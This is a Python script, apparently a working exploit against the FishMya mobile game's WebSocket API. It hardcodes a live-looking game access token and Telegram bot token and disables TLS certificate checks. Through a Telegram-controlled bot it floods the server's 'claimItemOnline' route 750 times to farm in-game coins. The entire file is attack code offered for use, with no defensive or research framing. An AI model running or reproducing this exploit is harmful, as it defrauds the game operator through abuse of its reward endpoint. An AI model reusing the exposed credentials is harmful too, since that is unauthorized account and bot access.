#!/usr/bin/env python3
"""
FishMya Game - Multi-Route Parallel Exploit
Author: GHOST
Version: 12.0 - 5 Routes Parallel Exploit
"""

import asyncio
import aiohttp
import json
import time
import sys
from datetime import datetime
from typing import Dict, List, Optional, Any
import logging
import msgpack
import ssl
import websocket
import threading
from concurrent.futures import ThreadPoolExecutor

# ==================== CONFIGURATION ====================
TELEGRAM_BOT_TOKEN = "8801207672:AAEsJfwy12ePwpjvDNalCeIrYQl-91vgMMk"
GAME_ACCESS_TOKEN = "eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJkMDBvMWdJdXhnTHNsY1BoT0tuNkVwNkNLVEw5U21mWEU3ZUVDUUV5OUk4In0.eyJqdGkiOiIxMzFlZWE5OS1mZWNiLTRjNjMtYWZkMy02MDI4MDExYzczYjciLCJleHAiOjE3ODk3NTY5NTAsIm5iZiI6MCwiaWF0IjoxNzg3MDc4NTUwLCJpc3MiOiJodHRwczovL2lkLm15dGVsLmNvbS5tbS9hdXRoL3JlYWxtcy9jaW0iLCJhdWQiOiJhY2NvdW50Iiwic3ViIjoiMTgwMjc3MWUtNDI2Mi00MzkwLTkzYTAtNTgxMDA0NTViMDZhIiwidHlwIjoiQmVhcmVyIiwiYXpwIjoiY3BtLWNsaWVudCIsImF1dGhfdGltZSI6MCwic2Vzc2lvbl9zdGF0ZSI6ImFjNWViYzI0LTdjMTUtNDYwZC04NDgzLWY0MzI2YzU0NDk2YiIsImFjciI6IjEiLCJyZWFsbV9hY2Nlc3MiOnsicm9sZXMiOlsib2ZmbGluZV9hY2Nlc3MiLCJ1bWFfYXV0aG9yaXphdGlvbiJdfSwicmVzb3VyY2VfYWNjZXNzIjp7ImFjY291bnQiOnsicm9sZXMiOlsibWFuYWdlLWFjY291bnQiLCJtYW5hZ2UtYWNjb3VudC1saW5rcyIsInZpZXctcHJvZmlsZSJdfX0sInNjb3BlIjoicHJvZmlsZSBlbWFpbCIsImVtYWlsX3ZlcmlmaWVkIjpmYWxzZSwicHJlZmVycmVkX3VzZXJuYW1lIjoiYzYxNDgwMzAtNTMwNS00YWUxLTkwNjYtZDA5MTM0Yzg0MGFlIiwiaWQiOiIxODAyNzcxZS00MjYyLTQzOTAtOTNhMC01ODEwMDQ1NWIwNmEifQ.nG5DWSXOdVkdojz31jD6OonpRbZ_WutgRlzXx93rNBqeX4cTxMpr0B-7z2bDCB5R27EOrbg1DTKPo62eiI8qy94mEeg1wbKFvJOKXxjkugAwq5OZcSUcHeWR9KOS4cZciVAiph4TMNXbwhPWu-mW55zYkRNGXW9NPfd_zJZvnokgGEXFAPUYn0rdGX6vxYIgglbyDPRL1lftxFT0YmfFUruj2_Kva11xh1DN-m5yMlXZA1AtBLAlHDvllEzULXHu6f3ByiuTA_PvdZumJlLVZTBChcIHiDGOniANpK_DKMXoohrOl_DrZD9GcLAGstK6zR98hjmEF0P2OE4BCrkGEQ"
WS_URL = "wss://api-fishmcloud.ugame.vn:2083"

WS_HEADERS = {
    "User-Agent": "Android SM-S918B",
    "Origin": "https://fishmya.ugame.vn",
    "X-Requested-With": "com.mytel.myid"
}

# ==================== LOGGING ====================
logging.basicConfig(
    format='%(asctime)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    stream=sys.stdout
)
logger = logging.getLogger(__name__)

# ==================== TELEGRAM API ====================
TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
last_update_id = 0

# ==================== EXPLOIT CONFIG ====================
EXPLOIT_ROUTES = [
    {"route": "claimItemOnline", "package": 1, "coins": 300},
    {"route": "claimItemOnline", "package": 2, "coins": 500},
    {"route": "claimItemOnline", "package": 3, "coins": 800},
    {"route": "claimItemOnline", "package": 4, "coins": 1000},
    {"route": "claimItemOnline", "package": 5, "coins": 1500},
]

CLAIMS_PER_ROUTE = 150  # တစ်ခုကို 150 ကြိမ်
TOTAL_CLAIMS = len(EXPLOIT_ROUTES) * CLAIMS_PER_ROUTE  # 750 total

# ==================== STATE ====================
exploit_state = {
    'is_running': False,
    'total_claimed': 0,
    'current_balance': 0,
    'start_balance': 0,
    'claims_done': 0,
    'total_claims': TOTAL_CLAIMS,
    'errors': 0,
    'last_error': 'None',
    'start_time': None,
    'last_update_time': None,
    'route_stats': {
        1: {'sent': 0, 'received': 0, 'coins': 0},
        2: {'sent': 0, 'received': 0, 'coins': 0},
        3: {'sent': 0, 'received': 0, 'coins': 0},
        4: {'sent': 0, 'received': 0, 'coins': 0},
        5: {'sent': 0, 'received': 0, 'coins': 0},
    }
}

state_lock = threading.Lock()

# ==================== UTILS ====================
async def send_telegram(chat_id: str, text: str):
    """Send Telegram message"""
    url = f"{TELEGRAM_API}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': text,
        'parse_mode': 'Markdown'
    }
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload, timeout=15) as response:
                if response.status == 200:
                    return True
                else:
                    logger.error(f"Telegram failed: {response.status}")
                    return False
    except Exception as e:
        logger.error(f"Telegram error: {e}")
        return False

async def get_updates(offset: int = 0) -> List[Dict]:
    """Get Telegram updates"""
    url = f"{TELEGRAM_API}/getUpdates"
    params = {'timeout': 30, 'offset': offset}
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, params=params, timeout=35) as response:
                data = await response.json()
                if data.get('ok'):
                    return data.get('result', [])
    except:
        pass
    
    return []

# ==================== EXPLOIT ENGINE ====================
def exploit_loop(chat_id: str):
    """Main exploit loop - 5 routes parallel"""
    global exploit_state
    
    exploit_state['is_running'] = True
    exploit_state['total_claimed'] = 0
    exploit_state['claims_done'] = 0
    exploit_state['errors'] = 0
    exploit_state['start_time'] = datetime.now()
    
    logger.info(f"🚀 Starting parallel exploit: {len(EXPLOIT_ROUTES)} routes x {CLAIMS_PER_ROUTE} claims")
    
    asyncio.run(send_telegram(
        chat_id,
        f"🚀 *Parallel Exploit Started!*\n\n"
        f"📍 Routes: {len(EXPLOIT_ROUTES)}\n"
        f"📦 Claims per Route: {CLAIMS_PER_ROUTE}\n"
        f"🔢 Total Claims: {TOTAL_CLAIMS}\n\n"
        f"💡 Use /status to check progress"
    ))
    
    while exploit_state['is_running']:
        try:
            # Connect WebSocket
            ws = websocket.create_connection(
                WS_URL,
                sslopt={"cert_reqs": ssl.CERT_NONE},
                header=[f"{k}: {v}" for k, v in WS_HEADERS.items()],
                timeout=30
            )
            
            # Login
            ws.send(msgpack.packb({
                "route": "mytelLogin",
                "data": {"accessToken": GAME_ACCESS_TOKEN, "language": "my"},
                "msgId": 1
            }, use_bin_type=True), opcode=websocket.ABNF.OPCODE_BINARY)
            
            # Wait for login
            ws.settimeout(10)
            login_ok = False
            
            for _ in range(20):
                try:
                    m = ws.recv()
                    d = msgpack.unpackb(m, raw=False)
                    if d.get("msgId") == 1 and d.get("data", {}).get("ok"):
                        login_ok = True
                        exploit_state['start_balance'] = d.get("data", {}).get("cash", 0)
                        exploit_state['current_balance'] = exploit_state['start_balance']
                        logger.info(f"✅ Login OK! Balance: {exploit_state['start_balance']:,}")
                        break
                except:
                    break
            
            if not login_ok:
                logger.error("❌ Login failed, retrying...")
                ws.close()
                time.sleep(3)
                continue
            
            # Enter room
            ws.send(msgpack.packb({
                "route": "play",
                "data": {"roomId": 1},
                "msgId": 2
            }, use_bin_type=True), opcode=websocket.ABNF.OPCODE_BINARY)
            time.sleep(1)
            
            # Start parallel sending
            msg_id_base = 10000
            messages_sent = 0
            last_progress_time = time.time()
            
            # Send all 5 routes simultaneously in batches
            for claim_index in range(CLAIMS_PER_ROUTE):
                if not exploit_state['is_running']:
                    break
                
                # Send all 5 routes at once (parallel)
                for route_info in EXPLOIT_ROUTES:
                    package = route_info['package']
                    
                    ws.send(msgpack.packb({
                        "route": "claimItemOnline",
                        "data": {"package": package},
                        "msgId": msg_id_base
                    }, use_bin_type=True), opcode=websocket.ABNF.OPCODE_BINARY)
                    
                    msg_id_base += 1
                    messages_sent += 1
                    
                    with state_lock:
                        exploit_state['route_stats'][package]['sent'] += 1
                
                # Receive responses
                ws.settimeout(0.5)
                try:
                    while True:
                        m = ws.recv()
                        d = msgpack.unpackb(m, raw=False)
                        
                        route = d.get("route", "")
                        inner = d.get("data", {})
                        
                        if route == "reloadCash":
                            change = inner.get("changeCash", 0)
                            if change > 0:
                                with state_lock:
                                    exploit_state['total_claimed'] += change
                                    exploit_state['current_balance'] = inner.get("newCash", exploit_state['current_balance'])
                                    exploit_state['claims_done'] += 1
                                
                                # Determine which package this belongs to
                                # (approximate by coin amount)
                                for ri in EXPLOIT_ROUTES:
                                    if abs(change - ri['coins']) <= 50:
                                        with state_lock:
                                            exploit_state['route_stats'][ri['package']]['received'] += 1
                                            exploit_state['route_stats'][ri['package']]['coins'] += change
                                        break
                
                except websocket.WebSocketTimeoutException:
                    pass
                except:
                    pass
                
                # Update status every 5 seconds (not every claim)
                current_time = time.time()
                if current_time - last_progress_time >= 5:
                    last_progress_time = current_time
                    
                    with state_lock:
                        progress = (exploit_state['claims_done'] / TOTAL_CLAIMS) * 100
                        logger.info(
                            f"📊 Progress: {progress:.1f}% | "
                            f"Claims: {exploit_state['claims_done']}/{TOTAL_CLAIMS} | "
                            f"Gained: {exploit_state['total_claimed']:,}"
                        )
                
                # Small delay to avoid overwhelming
                time.sleep(0.01)
            
            ws.close()
            logger.info("✅ Connection cycle completed")
            
            # Check if all claims done
            with state_lock:
                if exploit_state['claims_done'] >= TOTAL_CLAIMS:
                    logger.info("🎉 All claims completed!")
                    asyncio.run(send_telegram(
                        chat_id,
                        f"🎉 *Exploit Complete!*\n\n"
                        f"📦 Total Claims: {exploit_state['claims_done']:,}\n"
                        f"💰 Total Gained: {exploit_state['total_claimed']:,}\n"
                        f"💎 Final Balance: {exploit_state['current_balance']:,}"
                    ))
                    exploit_state['is_running'] = False
                    break
        
        except Exception as e:
            logger.error(f"❌ Exploit error: {e}")
            with state_lock:
                exploit_state['errors'] += 1
                exploit_state['last_error'] = str(e)
            
            # Auto restart immediately
            logger.info("🔄 Auto restarting in 2 seconds...")
            time.sleep(2)
            continue
    
    exploit_state['is_running'] = False
    logger.info("Exploit loop ended")

# ==================== COMMANDS ====================
async def process_command(chat_id: str, command: str):
    """Process commands"""
    command = command.lower().strip()
    
    if command in ['/start', '/help', '1']:
        help_text = (
            "⚡ *Parallel Exploit Bot*\n\n"
            "5 Routes တစ်ပြိုင်တည်း:\n"
            "📍 Package 1: 300 coins\n"
            "📍 Package 2: 500 coins\n"
            "📍 Package 3: 800 coins\n"
            "📍 Package 4: 1,000 coins\n"
            "📍 Package 5: 1,500 coins\n\n"
            "📦 Per Route: 150 claims\n"
            "🔢 Total: 750 claims\n\n"
            "📋 *Commands:*\n"
            "🔹 `/start` - Exploit စတင်ရန်\n"
            "🔹 `/stop` - ရပ်ရန်\n"
            "🔹 `/status` - Progress ကြည့်ရန်\n\n"
            "⚡ *Powered by GHOST AI*"
        )
        await send_telegram(chat_id, help_text)
    
    elif command in ['/start', '/run', '/exploit', '/mine']:
        if exploit_state['is_running']:
            await send_telegram(chat_id, "⚠️ *Already running!* Use /status to check progress.")
            return
        
        # Start exploit in thread
        thread = threading.Thread(target=exploit_loop, args=(chat_id,), daemon=True)
        thread.start()
    
    elif command in ['/stop', '/end']:
        exploit_state['is_running'] = False
        await send_telegram(
            chat_id,
            f"🛑 *Stopped!*\n\n"
            f"💰 Total Gained: {exploit_state['total_claimed']:,}\n"
            f"📦 Claims Done: {exploit_state['claims_done']:,}"
        )
    
    elif command in ['/status', '/info']:
        with state_lock:
            status = "🟢 Running" if exploit_state['is_running'] else "🔴 Stopped"
            progress = 0
            if exploit_state['total_claims'] > 0:
                progress = (exploit_state['claims_done'] / exploit_state['total_claims']) * 100
            
            status_text = (
                f"📊 *Exploit Status*\n\n"
                f"State: {status}\n"
                f"Progress: {progress:.1f}%\n"
                f"📦 Claims: {exploit_state['claims_done']:,}/{exploit_state['total_claims']:,}\n"
                f"💰 Start Balance: {exploit_state['start_balance']:,}\n"
                f"💎 Current Balance: {exploit_state['current_balance']:,}\n"
                f"📈 Total Gained: +{exploit_state['total_claimed']:,}\n"
                f"⚠️ Errors: {exploit_state['errors']}\n"
                f"🕐 Running: {datetime.now().strftime('%H:%M:%S')}"
            )
            
            # Route details
            status_text += "\n\n*Route Details:*\n"
            for ri in EXPLOIT_ROUTES:
                pkg = ri['package']
                rs = exploit_state['route_stats'][pkg]
                status_text += (
                    f"📍 Pkg {pkg}: {rs['sent']} sent, "
                    f"{rs['received']} recv, "
                    f"{rs['coins']:,} coins\n"
                )
        
        await send_telegram(chat_id, status_text)

# ==================== MAIN ====================
async def main():
    global last_update_id
    
    print("\n" + "=" * 60)
    print("⚡ FishMya Parallel Exploit Bot")
    print(f"⏰ Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"🔑 Token: {'✅ Set' if GAME_ACCESS_TOKEN else '❌ Not set'}")
    print(f"📍 Routes: {len(EXPLOIT_ROUTES)}")
    print(f"📦 Per Route: {CLAIMS_PER_ROUTE}")
    print(f"🔢 Total: {TOTAL_CLAIMS}")
    print("=" * 60 + "\n")
    
    logger.info("🤖 Bot polling...")
    logger.info("💡 Send /start to begin exploit!")
    
    while True:
        try:
            updates = await get_updates(last_update_id + 1)
            
            for update in updates:
                update_id = update.get('update_id', 0)
                
                if update_id > last_update_id:
                    last_update_id = update_id
                
                if 'message' in update:
                    message = update['message']
                    chat_id = str(message.get('chat', {}).get('id', ''))
                    text = message.get('text', '')
                    
                    if chat_id and text:
                        logger.info(f"📩 {chat_id}: {text}")
                        await process_command(chat_id, text)
            
            await asyncio.sleep(2)
            
        except KeyboardInterrupt:
            exploit_state['is_running'] = False
            break
        except Exception as e:
            logger.error(f"Error: {e}")
            await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(main())
